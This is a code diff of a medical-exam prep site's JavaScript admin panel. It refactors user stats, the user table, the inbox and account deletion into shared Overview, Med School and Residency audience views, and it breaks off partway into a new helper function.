@@ -5848,6 +6123,8 @@
       let torndown = 0;
       if (typeof adminUsersStreamUnsub === 'function') { adminUsersStreamUnsub(); adminUsersStreamUnsub = null; torndown++; }
       if (typeof adminTransactionsStreamUnsub === 'function') { adminTransactionsStreamUnsub(); adminTransactionsStreamUnsub = null; torndown++; }
+      if (typeof adminDashBookingsUnsub === 'function') { adminDashBookingsUnsub(); adminDashBookingsUnsub = null; torndown++; }
+      if (typeof adminDashMessagesUnsub === 'function') { adminDashMessagesUnsub(); adminDashMessagesUnsub = null; torndown++; }
       if (typeof adminVisitsStreamUnsub === 'function') { adminVisitsStreamUnsub(); adminVisitsStreamUnsub = null; torndown++; }
       if (typeof adminVisitsByDayUnsub === 'function') { adminVisitsByDayUnsub(); adminVisitsByDayUnsub = null; torndown++; }
       if (typeof adminVisitsByCountryUnsub === 'function') { adminVisitsByCountryUnsub(); adminVisitsByCountryUnsub = null; torndown++; }
@@ -5902,11 +6179,11 @@
         // the render forever.
         const firestoreReady = (window._firestoreUsersLoaded === true);
         if (!authReady || !firestoreReady) {
-          // Don't render — tiles stay at "-" (their HTML default)
-          // until BOTH sources land. The other callsite that drives
-          // us (subscribeAllUsers callback OR loadAdminUsers finally
-          // populating allAdminUsers) will trigger this function
-          // again. No-op on missing data is the right shape.
+          // Cards show "Loading…" until BOTH sources land. The other
+          // callsite that drives us (subscribeAllUsers callback OR
+          // loadAdminUsers finally populating allAdminUsers) will
+          // trigger this function again.
+          renderAdminAudience();
           return;
         }
         const authIds = new Set(allAdminUsers.map(u => u.id));
@@ -5917,81 +6194,12 @@
             rawUsers.filter(u => !authIds.has(u.id)).map(u => u.id));
         }
 
-        const now = new Date();
-        const monthStart = new Date(now.getFullYear(), now.getMonth(), 1);
-
-        let newThisMonth = 0;
-        let qbankActiveCount = 0;
-
-        users.forEach(u => {
-          if (u.createdAt) {
-            const created = u.createdAt.toDate ? u.createdAt.toDate() : new Date(u.createdAt);
-            if (created >= monthStart) newThisMonth++;
-          }
-          // qbankActive proxy: any user who has interacted with QBank.
-          // (Subcollection check is too read-heavy for a live stream — we
-          // approximate via a `qbankActive` field if present, or fall back
-          // to anyone with a payments.exam-bank entry at all.)
-          if (u.qbankActive === true || (u.payments && u.payments['exam-bank'])) {
-            qbankActiveCount++;
-          }
-        });
-
-        // Total Users = merged Auth+Firestore set (matches the table row
-        // count exactly). Intersecting with Firestore would omit Auth-only
-        // accounts whose profile doc failed to land on signup — those
-        // users are real and admin can see them in the table, so they
-        // count. `newThisMonth` still derives from the intersection because
-        // it needs the Firestore `createdAt` field.
-        document.getElementById('adminStatTotalUsers').textContent = allAdminUsers.length;
-        document.getElementById('adminStatNewUsers').textContent = newThisMonth;
-        document.getElementById('adminStatQbankUsers').textContent = qbankActiveCount;
-
-        renderRevenueStats();
+        // Cards, lists and the people table are drawn per audience view by
+        // renderAdminAudience() (see "Admin audience views" below). Paying
+        // customers and revenue come from the Stripe payment ledger only.
+        renderAdminAudience();
       }
 
-      // Paying Users + Total Revenue come from the Stripe payment LEDGER
-      // (transactions/{checkoutSessionId}), not from users/{uid}.payments.
-      //
-      // The old calculation only looked at payments['exam-bank'] and priced
-      // it from a hardcoded table, so every other product — Strategy
-      // Session and all seven Match Mentorship add-ons — was invisible to
-      // both tiles no matter what Stripe charged. The ledger holds the
-      // amount Stripe actually collected, one doc per Checkout Session, so
-      // a payment cannot be counted twice and refunds net out. The rules
-      // for what counts (live mode, paid, net of refunds) live in
-      // revenue-stats.js, shared with test/payments.test.js.
-      //
-      // Admin/internal accounts stay excluded, as before, so test purchases
-      // don't pollute real metrics.
-      function renderRevenueStats() {
-        const paidEl = document.getElementById('adminStatPaidUsers');
-        const revEl = document.getElementById('adminStatRevenue');
-        if (window._transactionsError) {
-          paidEl.textContent = '—';
-          revEl.textContent = '—';
-          paidEl.title = revEl.title = 'Payment ledger unavailable: ' + window._transactionsError;
-          return;
-        }
-        // Hold at the "-" placeholder until the ledger has loaded at least
-        // once, same no-flicker policy as the other tiles.
-        if (window._transactionsLoaded !== true || typeof SHOSRevenue === 'undefined') return;
-
-        const adminUids = (Array.isArray(allAdminUsers) ? allAdminUsers : [])
-          .filter(u => ADMIN_EMAILS_SET.has((u.email || '').toLowerCase()))
-          .map(u => u.id);
-        const r = SHOSRevenue.summarizeRevenue(window._latestTransactions || [], {
-          excludeEmails: Array.from(ADMIN_EMAILS_SET),
-          excludeUids: adminUids,
-        });
-        paidEl.textContent = r.payingUsers;
-        revEl.textContent = SHOSRevenue.formatUsd(r.revenueCents);
-        paidEl.title = revEl.title = r.transactionsCounted + ' qualifying Stripe payment(s)';
-        const otherCurrencies = Object.keys(r.revenueByCurrency).filter(c => c !== 'usd');
-        if (otherCurrencies.length) {
-          console.warn('[admin] non-USD revenue not included in the USD total:', r.revenueByCurrency);
-        }
-      }
       // Expose so loadAdminUsers can trigger a recompute as soon as it
       // has the Auth-backed user set ready.
       window.recomputeAdminStats = recomputeAdminStats;
@@ -6026,6 +6234,27 @@
         // rather than leaving them on a silent '-' or showing a false $0.
         window._transactionsError = (err && (err.code || err.message)) || 'unknown error';
         recomputeAdminStats();
+      });
+
+      // Bookings + messages for the dashboard's "Needs attention", "Upcoming
+      // bookings" and user details. (The Inbox / Bookings / Calendar tabs
+      // keep their own subscriptions with their own filters.)
+      window._adminBookingsLoaded = false;
+      window._adminMessagesLoaded = false;
+      adminDashBookingsUnsub = subscribeAdminBookings('all', list => {
+        window._adminBookings = list;
+        window._adminBookingsLoaded = true;
+        window._adminBookingsError = null;
+        renderAdminAttention(adminDataState());
+        renderAdminUpcoming();
+      }, err => {
+        window._adminBookingsError = (err && (err.code || err.message)) || 'error';
+        renderAdminUpcoming();
+      });
+      adminDashMessagesUnsub = subscribeAdminMessages('all', 'all', list => {
+        window._adminMessages = list;
+        window._adminMessagesLoaded = true;
+        renderAdminAttention(adminDataState());
       });
 
       adminUsersStreamUnsub = subscribeAllUsers(users => {
@@ -6082,30 +6311,10 @@
                          changedRows.length ? changedRows : '');
           }
           if (anyChanged) {
-            // Rebuild filteredAdminUsers from the current search + filter
-            // then re-render. Simplest: trigger the search input's
-            // existing filter path if any query is active, otherwise
-            // reset filteredAdminUsers to a fresh copy.
-            const searchInput = document.getElementById('adminUserSearch');
-            const filterSelect = document.getElementById('adminUserFilter');
-            const query = searchInput ? searchInput.value.trim().toLowerCase() : '';
-            const filter = filterSelect ? filterSelect.value : 'all';
-            filteredAdminUsers = allAdminUsers.filter(u => {
-              if (query) {
-                const n = (u.name || '').toLowerCase();
-                const e = (u.email || '').toLowerCase();
-                if (!n.includes(query) && !e.includes(query)) return false;
-              }
-              if (filter === 'applicant' && u.path !== 'applicant') return false;
-              if (filter === 'student' && u.path !== 'student') return false;
-              if (filter === 'paid' && u.payments?.['exam-bank'] !== 'paid') return false;
-              if (filter === 'free' && u.payments?.['exam-bank'] === 'paid') return false;
-              return true;
-            });
-            if (typeof renderAdminUsersPage === 'function') {
-              renderAdminUsersPage();
-              if (window.__SHOS_VISIT_DEBUG) console.info('[visit-admin] renderAdminUsersPage() called');
-            }
+            // Re-draw the current view (cards, lists, people table) from the
+            // merged data, keeping the current search + filter.
+            renderAdminAudience();
+            if (window.__SHOS_VISIT_DEBUG) console.info('[visit-admin] renderAdminAudience() called');
           }
         }
 
@@ -6130,6 +6339,7 @@
 
       // Total site visits → live count (anonymous-visitor counter only)
       adminVisitsStreamUnsub = subscribeSiteVisits(count => {
+        window._siteVisits = count;   // kept so the Overview card survives re-renders
         const el = document.getElementById('adminStatVisits');
         if (el) el.textContent = count.toLocaleString();
       });
@@ -6392,14 +6602,18 @@
           source = 'firestore-only';
         } catch (err) {
           console.error('Failed to load admin users:', err);
-          loadingEl.textContent = 'Failed to load users: ' + err.message;
+          loadingEl.textContent = 'Couldn\'t load users (' + err.message + '). Refresh the page to try again.';
+          window._adminUsersError = err.message;
+          renderAdminAudience();
           return;
         }
       }
 
       console.log('[admin] loaded', users.length, 'users via', source);
       allAdminUsers = users;
-      filteredAdminUsers = [...allAdminUsers];
+      window._adminUsersError = null;
+      refreshAdminPeople();
+      applyAdminUserFilters();
 
       // Trigger an immediate stat-tile recompute now that the canonical
       // Auth-backed user list is available. Without this, the tiles
@@ -6415,100 +6629,6 @@
 
       renderAdminUsersPage();
       setupAdminSearch();
-    }
-
-    function renderAdminUsersPage() {
-      const tbody = document.getElementById('adminUsersBody');
-      const start = (adminCurrentPage - 1) * ADMIN_PAGE_SIZE;
-      const pageUsers = filteredAdminUsers.slice(start, start + ADMIN_PAGE_SIZE);
-
-      if (pageUsers.length === 0) {
-        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:24px;">No users found.</td></tr>';
-        document.getElementById('adminPagination').innerHTML = '';
-        return;
-      }
-
-      // Keep these lists in sync with isAdmin() in firestore.rules and
-      // the equivalent lists elsewhere in this file (search ADMIN_EMAILS).
-      // Admins implicitly access both Applicant + Student content, so the
-      // Path column shows a distinct "Admin" badge instead of "-".
-      const PATH_ADMIN_EMAILS = ['eli@shosmed.com', 'contact@shosmed.com', 'privacy@shosmed.com', 'elizolotov@gmail.com'];
-      const PATH_REVIEWER_EMAILS = ['jana.fauknerova@lf3.cuni.cz'];
-
-      let html = '';
-      pageUsers.forEach(u => {
-        const name = u.name || '(no name)';
-        const email = u.email || '-';
-        // Admin/reviewer status overrides the `path` field. Admins
-        // effectively have both paths; reviewers are trusted
-        // contributors (e.g. LF3 faculty grading questions) and
-        // aren't really "students" or "applicants" in the QBank
-        // funnel sense.
-        const emailLc = (u.email || '').toLowerCase();
-        const isAdminUser = PATH_ADMIN_EMAILS.includes(emailLc);
-        const isReviewerUser = PATH_REVIEWER_EMAILS.includes(emailLc);
-        const path = u.path || '-';
-        let pathBadge;
-        if (isAdminUser) {
-          pathBadge = '<span class="admin-badge admin-badge-admin" title="Admin (access to both paths)">Admin</span>';
-        } else if (isReviewerUser) {
-          pathBadge = '<span class="admin-badge admin-badge-reviewer" title="QBank reviewer">Reviewer</span>';
-        } else if (path === 'applicant') {
-          pathBadge = '<span class="admin-badge admin-badge-applicant" title="Preparing for medical-school entrance exams">Med School</span>';
-        } else if (path === 'student') {
-          pathBadge = '<span class="admin-badge admin-badge-student" title="Preparing for USMLE / residency match">Residency</span>';
-        } else {
-          // Explicit "Not yet" state so admin can tell an uncategorized
-          // user apart from a display bug. Amber pill so it stands out
-          // as an action item — this user needs to pick a path.
-          pathBadge = '<span class="admin-badge" style="background:#FEF3C7;color:#92400E;" title="This user has not chosen Med School vs Residency. They will be prompted on next login, or use the Details panel to set it for them.">Not yet</span>';
-        }
-
-        // Resolve signup date from either the Cloud-Function `createdAtMs`
-        // (number) or the legacy Firestore `createdAt` (Timestamp / string).
-        let signupDate = '-';
-        const ms = u.createdAtMs
-          ?? (u.createdAt && u.createdAt.toMillis ? u.createdAt.toMillis()
-              : u.createdAt ? new Date(u.createdAt).getTime() : null);
-        if (ms) {
-          signupDate = new Date(ms).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
-        }
-
-        const isPaid = u.payments?.['exam-bank'] === 'paid';
-        const planType = u.payments?.['exam-bank-plan'] || '';
-        const planLabel = planType ? (' (' + planType.replace('qbank-', '') + ')') : '';
-        const statusBadge = isPaid
-          ? '<span class="admin-badge admin-badge-paid">Paid' + planLabel + '</span>'
-          : '<span class="admin-badge admin-badge-free">Free</span>';
-
-        const toggleClass = isPaid ? 'admin-btn-revoke' : 'admin-btn-grant';
-        const toggleLabel = isPaid ? 'Revoke' : 'Grant';
-
-        const visitCount = (typeof u.visitCount === 'number' && u.visitCount > 0)
-          ? u.visitCount
-          : 0;
-        const visitCell = visitCount > 0
-          ? `<span style="font-weight:600; color:#0f172a;">${visitCount}</span>`
-          : `<span style="color:#cbd5e1;">0</span>`;
-
-        html += `<tr data-uid="${u.id}">
-          <td>${escapeHtml(name)}</td>
-          <td style="font-size:0.82rem;">${escapeHtml(email)}</td>
-          <td>${pathBadge}</td>
-          <td style="white-space:nowrap;">${signupDate}</td>
-          <td style="text-align:center;">${visitCell}</td>
-          <td>${statusBadge}</td>
-          <td style="white-space:nowrap;">
-            <button class="admin-action-btn ${toggleClass}" onclick="toggleQBankAccess('${u.id}', ${isPaid})">${toggleLabel}</button>
-            <button class="admin-action-btn admin-btn-details" onclick="toggleUserDetails('${u.id}', this)">Details</button>
-            <a class="admin-action-btn" style="background:#F1F5F9; color:#0F172A; border-color:#CBD5E1;" title="Open the dashboard exactly as this user sees it" href="dashboard.html?viewAs=${u.id}">View as</a>
-            <button class="admin-action-btn admin-btn-revoke" style="background:#dc2626; color:#fff; border-color:#dc2626;" onclick="deleteUserAccount('${u.id}', ${JSON.stringify(name).replace(/"/g, '&quot;')}, ${JSON.stringify(email).replace(/"/g, '&quot;')})">Delete</button>
-          </td>
-        </tr>`;
-      });
-
-      tbody.innerHTML = html;
-      renderAdminPagination();
     }
 
     function renderAdminPagination() {
@@ -6542,25 +6662,8 @@
       let debounceTimer;
 
       function applyFilters() {
-        const query = searchInput.value.trim().toLowerCase();
-        const filter = filterSelect.value;
-
-        filteredAdminUsers = allAdminUsers.filter(u => {
-          // Text search
-          if (query) {
-            const name = (u.name || '').toLowerCase();
-            const email = (u.email || '').toLowerCase();
-            if (!name.includes(query) && !email.includes(query)) return false;
-          }
-          // Category filter
-          if (filter === 'applicant' && u.path !== 'applicant') return false;
-          if (filter === 'student' && u.path !== 'student') return false;
-          if (filter === 'paid' && u.payments?.['exam-bank'] !== 'paid') return false;
-          if (filter === 'free' && u.payments?.['exam-bank'] === 'paid') return false;
-          return true;
-        });
-
         adminCurrentPage = 1;
+        applyAdminUserFilters();
         renderAdminUsersPage();
       }
 
@@ -6577,16 +6680,23 @@
     // Two-step confirm because this is irreversible.
     async function deleteUserAccount(uid, name, email) {
       const label = (name && name !== '(no name)') ? name : (email || uid);
-      // Hard confirm: must literally type 'delete' to proceed.
+      // Hard confirm: the admin must type this person's email address (or
+      // "delete" for an account without one). Lives only in the Details
+      // panel's Danger zone, away from everyday buttons.
+      const expected = email && email !== '-' ? String(email).trim().toLowerCase() : 'delete';
       const typed = prompt(
-        `⚠ Delete user "${label}" PERMANENTLY?\n\n` +
+        `Delete "${label}" PERMANENTLY?\n\n` +
         `This removes:\n` +
-        `  • Their Firebase Auth account (they lose all access)\n` +
-        `  • Their Firestore profile\n` +
-        `  • Their QBank progress, tests, and history\n\n` +
-        `This CANNOT be undone. Type "delete" (lowercase) to confirm:`
+        `  • Their sign-in account (they lose all access)\n` +
+        `  • Their profile\n` +
+        `  • Their QBank progress, tests, and history\n` +
+        `Their payment records are kept.\n\n` +
+        `This CANNOT be undone. To confirm, type ${expected === 'delete' ? '"delete"' : 'their email address (' + expected + ')'}:`
       );
-      if (typed !== 'delete') return;
+      if (typed == null || typed.trim().toLowerCase() !== expected) {
+        if (typed != null) alert('Not deleted: the confirmation did not match.');
+        return;
+      }
 
       try {
         const fn = firebase.functions().httpsCallable('deleteUser');
@@ -6601,8 +6711,7 @@
         // Remove from local cache + re-render so the row disappears immediately.
         if (typeof allAdminUsers !== 'undefined') {
           allAdminUsers = allAdminUsers.filter(u => u.id !== uid);
-          filteredAdminUsers = filteredAdminUsers.filter(u => u.id !== uid);
-          if (typeof renderAdminUsersPage === 'function') renderAdminUsersPage();
+          renderAdminAudience();
         }
       } catch (err) {
         console.error('deleteUser failed:', err);
@@ -6621,7 +6730,9 @@
       const btn = row ? row.querySelector('.admin-btn-grant, .admin-btn-revoke') : null;
       if (btn && btn.dataset.busy === '1') return;
 
-      if (!confirm(`Are you sure you want to ${action} QBank access for this user?`)) return;
+      if (!confirm(currentlyPaid
+        ? 'Switch QBank access OFF for this person?\n\nThis does not refund or change any payment.'
+        : 'Give this person complimentary QBank access?\n\nThis is not a purchase: it does not count as revenue or make them a paying customer.')) return;
 
       if (btn) {
         btn.dataset.busy = '1';
@@ -6680,24 +6791,8 @@
           }
         }
 
-        // Re-apply filters with updated data
-        const searchInput = document.getElementById('adminUserSearch');
-        const filterSelect = document.getElementById('adminUserFilter');
-        const query = searchInput.value.trim().toLowerCase();
-        const filter = filterSelect.value;
-        filteredAdminUsers = allAdminUsers.filter(u => {
-          if (query) {
-            const name = (u.name || '').toLowerCase();
-            const email = (u.email || '').toLowerCase();
-            if (!name.includes(query) && !email.includes(query)) return false;
-          }
-          if (filter === 'applicant' && u.path !== 'applicant') return false;
-          if (filter === 'student' && u.path !== 'student') return false;
-          if (filter === 'paid' && u.payments?.['exam-bank'] !== 'paid') return false;
-          if (filter === 'free' && u.payments?.['exam-bank'] === 'paid') return false;
-          return true;
-        });
-        renderAdminUsersPage();
+        // Re-draw the current view with the updated access.
+        renderAdminAudience();
 
         // Stats refresh: no explicit re-subscribe needed. The live
         // `subscribeAllUsers` stream is already attached from the initial
@@ -6727,90 +6822,6 @@
           }
         }
       }
-    }
-
-    // ===== User Details Expand =====
-    function toggleUserDetails(uid, btn) {
-      const row = btn.closest('tr');
-      const existingDetails = row.nextElementSibling;
-      if (existingDetails && existingDetails.classList.contains('admin-details-row')) {
-        existingDetails.remove();
-        return;
-      }
-
-      const user = allAdminUsers.find(u => u.id === uid);
-      if (!user) return;
-
-      const detailsRow = document.createElement('tr');
-      detailsRow.className = 'admin-details-row';
-      const td = document.createElement('td');
-      td.colSpan = 7;
-      td.className = 'admin-user-details';
-
-      // Resolve a human-readable path label, accounting for admin /
-      // reviewer roles that override the on-record `path` field.
-      const detailsEmailLc = (user.email || '').toLowerCase();
-      const PATH_ADMIN_EMAILS_D = ['eli@shosmed.com', 'contact@shosmed.com', 'privacy@shosmed.com', 'elizolotov@gmail.com'];
-      const PATH_REVIEWER_EMAILS_D = ['jana.fauknerova@lf3.cuni.cz'];
-      let pathDisplay;
-      if (PATH_ADMIN_EMAILS_D.includes(detailsEmailLc))         pathDisplay = 'Admin (full access — both paths)';
-      else if (PATH_REVIEWER_EMAILS_D.includes(detailsEmailLc)) pathDisplay = 'Reviewer';
-      else if (user.path === 'applicant')                        pathDisplay = 'Med School';
-      else if (user.path === 'student')                          pathDisplay = 'Residency';
-      else                                                       pathDisplay = 'Not yet';
-
-      let info = '';
-      info += `<strong>UID:</strong> ${uid}<br>`;
-      info += `<strong>Name:</strong> ${escapeHtml(user.name || '-')}<br>`;
-      info += `<strong>Email:</strong> ${escapeHtml(user.email || '-')}<br>`;
-      // Path row + inline setter. Admin/reviewer accounts are defined by
-       // email so we don't offer to set path for them (would be misleading).
-       // For everyone else, show a small button group so admin can backfill
-       // legacy accounts or override a user's choice.
-       const isAdminOrReviewer = PATH_ADMIN_EMAILS_D.includes(detailsEmailLc) || PATH_REVIEWER_EMAILS_D.includes(detailsEmailLc);
-       if (isAdminOrReviewer) {
-         info += `<strong>Path:</strong> ${pathDisplay}<br>`;
-       } else {
-         const applicantSel = user.path === 'applicant' ? ' style="background:#dbeafe;color:#1d4ed8;border-color:#1d4ed8;"' : '';
-         const studentSel   = user.path === 'student'   ? ' style="background:#d1fae5;color:#065f46;border-color:#065f46;"' : '';
-         const clearBtn     = user.path ? `<button class="btn btn-outline btn-small" style="margin-left:4px;" onclick="adminSetUserPath('${uid}', null)">Clear</button>` : '';
-         info += `<strong>Path:</strong> ${pathDisplay}
-           <div style="display:inline-flex; gap:6px; margin-left:12px;">
-             <button class="btn btn-outline btn-small"${applicantSel} onclick="adminSetUserPath('${uid}', 'applicant')">Med School</button>
-             <button class="btn btn-outline btn-small"${studentSel} onclick="adminSetUserPath('${uid}', 'student')">Residency</button>
-             ${clearBtn}
-           </div><br>`;
-       }
-      // Created date — handle both the new Cloud-Function `createdAtMs`
-      // (number) and the legacy Firestore `createdAt` (Timestamp / string).
-      const userMs = user.createdAtMs
-        ?? (user.createdAt && user.createdAt.toMillis ? user.createdAt.toMillis()
-            : user.createdAt ? new Date(user.createdAt).getTime() : null);
-      if (userMs) {
-        info += `<strong>Created:</strong> ${new Date(userMs).toLocaleString()}<br>`;
-      }
-      info += `<strong>Site visits (sessions):</strong> ${typeof user.visitCount === 'number' ? user.visitCount : 0}<br>`;
-      if (user.lastVisitAt) {
-        const lv = user.lastVisitAt.toDate ? user.lastVisitAt.toDate() : new Date(user.lastVisitAt);
-        info += `<strong>Last visit:</strong> ${lv.toLocaleString()}<br>`;
-      }
-      if (user.hasFirestoreDoc === false) {
-        info += `<strong style="color:#dc2626;">⚠ Auth-only user (no Firestore profile yet — will self-heal on next sign-in)</strong><br>`;
-      }
-      if (user.payments) {
-        info += `<strong>Payments:</strong> ${JSON.stringify(user.payments)}<br>`;
-      }
-      if (user.examDate) info += `<strong>Exam Date:</strong> ${user.examDate}<br>`;
-      if (user.matchDate) info += `<strong>Match Date:</strong> ${user.matchDate}<br>`;
-      if (user.residencyProgress) {
-        const progress = Object.entries(user.residencyProgress)
-          .map(([k, v]) => k + ': ' + v).join(', ');
-        info += `<strong>Residency Progress:</strong> ${progress}<br>`;
-      }
-
-      td.innerHTML = info;
-      detailsRow.appendChild(td);
-      row.after(detailsRow);
     }
 
     // ===== Admin: set/clear a user's path (Applicant / Student / null) =====
@@ -6850,83 +6861,12 @@
 
     // ===== Recent Activity =====
     async function loadRecentActivity() {
-      // Recent signups
-      try {
-        const signupSnap = await db.collection('users')
-          .orderBy('createdAt', 'desc').limit(10).get();
-        const signupsEl = document.getElementById('adminRecentSignups');
-        if (signupSnap.empty) {
-          signupsEl.innerHTML = '<div class="admin-empty-msg">No signups yet.</div>';
-        } else {
-          let html = '';
-          signupSnap.forEach(doc => {
-            const u = doc.data();
-            const name = u.name || '(no name)';
-            let dateStr = '';
-            if (u.createdAt) {
-              const d = u.createdAt.toDate ? u.createdAt.toDate() : new Date(u.createdAt);
-              dateStr = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) + ' at ' +
-                d.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
-            }
-            const pathTag = u.path === 'applicant' ? ' (Applicant)' : u.path === 'student' ? ' (Student)' : '';
-            html += `<div class="admin-activity-item">
-              <div>${escapeHtml(name)}${pathTag}</div>
-              <div class="admin-activity-meta">${escapeHtml(u.email || '')} &middot; ${dateStr}</div>
-            </div>`;
-          });
-          signupsEl.innerHTML = html;
-        }
-      } catch (e) {
-        document.getElementById('adminRecentSignups').innerHTML = '<div class="admin-empty-msg">Could not load signups.</div>';
-      }
-
-      // Recent QBank tests - scan recent users for test history
-      try {
-        const testsEl = document.getElementById('adminRecentTests');
-        let allTests = [];
-        // Check users who have qbank data (limit to recent users for performance)
-        const recentUsers = allAdminUsers.slice(0, 50);
-        const testPromises = recentUsers.map(async u => {
-          try {
-            const histDoc = await db.collection('users').doc(u.id)
-              .collection('qbankData').doc('history').get();
-            if (histDoc.exists) {
-              const tests = histDoc.data().tests || [];
-              tests.forEach(t => {
-                allTests.push({ ...t, userName: u.name || u.email || 'Unknown' });
-              });
-            }
-          } catch (e) { /* skip */ }
-        });
-        await Promise.all(testPromises);
-
-        // Sort by date desc and take 10
-        allTests.sort((a, b) => {
-          const da = a.date ? new Date(a.date) : new Date(0);
-          const db2 = b.date ? new Date(b.date) : new Date(0);
-          return db2 - da;
-        });
-        const recentTests = allTests.slice(0, 10);
-
-        if (recentTests.length === 0) {
-          testsEl.innerHTML = '<div class="admin-empty-msg">No tests yet.</div>';
-        } else {
-          let html = '';
-          recentTests.forEach(t => {
-            const pct = t.total > 0 ? Math.round((t.correct / t.total) * 100) : 0;
-            const dateStr = t.date ? new Date(t.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) : '';
-            html += `<div class="admin-activity-item">
-              <div>${escapeHtml(t.userName)} - ${pct}% (${t.correct}/${t.total})</div>
-              <div class="admin-activity-meta">${dateStr}</div>
-            </div>`;
-          });
-          testsEl.innerHTML = html;
-        }
-      } catch (e) {
-        document.getElementById('adminRecentTests').innerHTML = '<div class="admin-empty-msg">Could not load tests.</div>';
-      }
-
-      // (Recent forum posts loader removed — KPI dropped from dashboard.)
+      // Recent sign-ups are drawn per view from the loaded user list
+      // (renderAdminSignups). Recent QBank tests load with the Med School
+      // view (loadQbankUsage), which reads every med-school applicant's
+      // history rather than only the 50 newest accounts.
+      renderAdminAudience();
+      if (adminView === 'med-school') loadQbankUsage();
     }
 
     // ===== Question Reports =====
@@ -7028,6 +6968,12 @@
         listEl.innerHTML = '';
         emptyEl.style.display = 'none';
         loadingEl.style.display = 'none';
+
+        // Count for the "Needs attention" list (Overview + Med School).
+        let openReports = 0;
+        reportsSnap.forEach(d => { if (!(d.data() || {}).resolved) openReports++; });
+        window._openReportsCount = openReports;
+        if (typeof renderAdminAttention === 'function') renderAdminAttention(adminDataState());
 
         if (reportsSnap.empty) {
           emptyEl.style.display = 'block';
@@ -7449,17 +7395,44 @@
       listEl.innerHTML = '';
       emptyEl.style.display = 'none';
 
-      // Live subscription — fires once immediately, then again on every change
+      // Live subscription — fires once immediately, then again on every
+      // change. Messages are kept so switching audience view re-filters
+      // without re-subscribing.
       inboxUnsubscribe = subscribeAdminMessages(statusFilter, catFilter, messages => {
         loadingEl.style.display = 'none';
-        listEl.innerHTML = '';
+        window._inboxMessages = messages;
+        paintInbox();
+      }, err => {
+        loadingEl.style.display = 'block';
+        loadingEl.textContent = 'Couldn\'t load messages (' + ((err && err.code) || 'error') + ').';
+      });
+    }
 
-        if (messages.length === 0) {
-          emptyEl.style.display = 'block';
-          return;
-        }
-        emptyEl.style.display = 'none';
-
+    function paintInbox() {
+      const listEl = document.getElementById('inboxList');
+      const emptyEl = document.getElementById('inboxEmpty');
+      const noteEl = document.getElementById('inboxAudienceNote');
+      const all = window._inboxMessages;
+      if (!listEl || !Array.isArray(all)) return;
+      const audSel = document.getElementById('inboxAudienceFilter');
+      const aud = adminView === 'overview' && audSel ? audSel.value : 'all';
+      const messages = all.filter(m => {
+        if (!SHOSAdmin.messageInView(m, adminView)) return false;
+        return aud === 'all' || SHOSCatalog.messageAudience(m).kind === aud;
+      });
+      if (noteEl) {
+        noteEl.textContent = adminView === 'overview'
+          ? 'All messages. Ones that are not about a specific audience are marked Unassigned or Shared and appear only here.'
+          : 'Messages sent about ' + ADMIN_VIEW_META[adminView].name + ' services. General questions appear in Overview.';
+      }
+      listEl.innerHTML = '';
+      if (messages.length === 0) {
+        emptyEl.textContent = adminView === 'overview' ? 'No messages found.' : 'No messages for ' + ADMIN_VIEW_META[adminView].name + '.';
+        emptyEl.style.display = 'block';
+        return;
+      }
+      emptyEl.style.display = 'none';
+      {
         messages.forEach(msg => {
           const card = document.createElement('div');
           card.className = 'inbox-card' + (msg.status === 'new' ? ' unread' : '');
@@ -7483,6 +7456,7 @@
             </div>
             <div class="inbox-meta">
               <span class="category-badge">${escapeHtml(catLabel)}</span>
+              ${adminView === 'overview' ? kindChip(SHOSCatalog.messageAudience(msg).kind) : ''}
               <span class="status-badge status-${msg.status}">${msg.status}</span>
               <span style="font-size:0.8rem; color:#9ca3af;">${escapeHtml(msg.email || '')}</span>
             </div>
@@ -7503,12 +7477,13 @@
           card.addEventListener('click', () => card.classList.toggle('open'));
           listEl.appendChild(card);
         });
-      });   // close subscribeAdminMessages callback
+      }
     }
 
     // Inbox filter listeners — re-open subscription with the new filter
     document.getElementById('inboxStatusFilter')?.addEventListener('change', () => { adminInboxLoaded = true; renderInbox(); });
     document.getElementById('inboxCategoryFilter')?.addEventListener('change', () => { adminInboxLoaded = true; renderInbox(); });
+    document.getElementById('inboxAudienceFilter')?.addEventListener('change', () => paintInbox());
 
     async function markMessage(id, status) {
       // The onSnapshot listener will repaint automatically — no explicit
@@ -7571,6 +7546,620 @@
       }
       clearInboxSelection();
       // onSnapshot listener will repaint the inbox automatically.
+    }
+
+    // =====================================================================
+    // ===== Admin audience views: Overview / Med School / Residency =====
+    // =====================================================================
+    // One Admin Panel, three views of the SAME data (listAllUsers + the
+    // Stripe payment ledger + bookings + messages). The decisions — who is
+    // in which audience, what counts as revenue, what access someone has —
+    // live in admin-audience.js / product-catalog.js (tested in
+    // test/admin-audience.test.js). This block only draws them.
+    //
+    // Views change what is SHOWN, never what is ALLOWED: every read and
+    // write below still goes through the same Firestore rules and admin-only
+    // Cloud Functions as before.
+    const ADMIN_AUDIENCE_CFG = {
+      adminEmails: ['eli@shosmed.com', 'contact@shosmed.com', 'privacy@shosmed.com', 'elizolotov@gmail.com'],
+      reviewerEmails: ['jana.fauknerova@lf3.cuni.cz'],
+    };
+    const ADMIN_VIEW_META = {
+      'overview':   { name: 'Overview · all audiences', people: 'Applicants', sub: 'Both audiences together: applicants, customers, revenue and everything that needs a reply.' },
+      'med-school': { name: 'Med School Applicants', people: 'Med School applicants', sub: 'Applicants preparing for medical school: QBank access and usage, question reports, purchases and bookings.' },
+      'residency':  { name: 'Residency Applicants', people: 'Residency applicants', sub: 'Applicants preparing for the US residency match: purchased services, bookings and inquiries.' },
+    };
+    function adminStore(key, value) {
+      try {
+        if (value === undefined) return localStorage.getItem(key);
+        localStorage.setItem(key, value);
+      } catch (_) { /* storage blocked: fall back to defaults */ }
+      return null;
+    }
+    let adminView = (function () {
+      const v = adminStore('shosAdminView');
+      return SHOSAdmin.VIEWS.includes(v) ? v : 'overview';
+    })();
+    let adminPeriod = (function () {
+      const p = adminStore('shosAdminPeriod');
+      return SHOSAdmin.PERIODS[p] ? p : 'all';
+    })();
+    window._adminPeopleById = {};
+    let adminPeople = [];
+
+    function adminNow() { return Date.now(); }
+    function money(cents, currency) {
+      const cur = String(currency || 'usd').toUpperCase();
+      if (cur === 'USD') return SHOSRevenue.formatUsd(cents);
+      return ((cents || 0) / 100).toFixed(2) + ' ' + cur;
+    }
+    function shortDate(ms) {
